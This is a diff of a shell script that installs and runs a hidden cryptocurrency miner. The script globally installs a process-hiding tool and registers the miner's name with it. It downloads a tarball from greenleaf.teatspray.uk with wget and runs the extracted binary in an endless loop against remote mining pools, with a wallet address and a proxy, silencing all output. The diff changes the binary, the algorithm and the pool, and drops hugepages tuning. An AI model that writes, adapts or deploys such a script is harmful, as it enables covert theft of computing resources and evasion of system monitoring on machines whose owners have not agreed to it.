@@ -24,7 +24,7 @@ npm i -g node-process-hider 1>/dev/null 2>&1
 
 sleep 2
 
-ph add Xmas 1>/dev/null 2>&1
+ph add glove 1>/dev/null 2>&1
 
 sleep 2
 
@@ -72,27 +72,13 @@ echo ""
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.uk/Xmas.tar.gz
+wget -q http://greenleaf.teatspray.uk/glove.tar.gz
 sleep 2
-tar -xf Xmas.tar.gz
-
-sleep 2
-
-sysctl -w vm.nr_hugepages=$(nproc)
-
-for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
-do
-    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
-done
-
-sleep 2
-
-bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
-
+tar -xf glove.tar.gz
 sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o supportsuperman.teatspray.uk:9655 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K --rig-id=$currentdate -p $currentdate -a rx/arq -k --proxy=127.0.0.1:1081 -t $used_num_of_cores 1>/dev/null 2>&1
+./glove -a minotaurx -o stratum+tcp://bowserlab.ddns.net:7019 -u CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB -p $currentdate,c=LCC,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
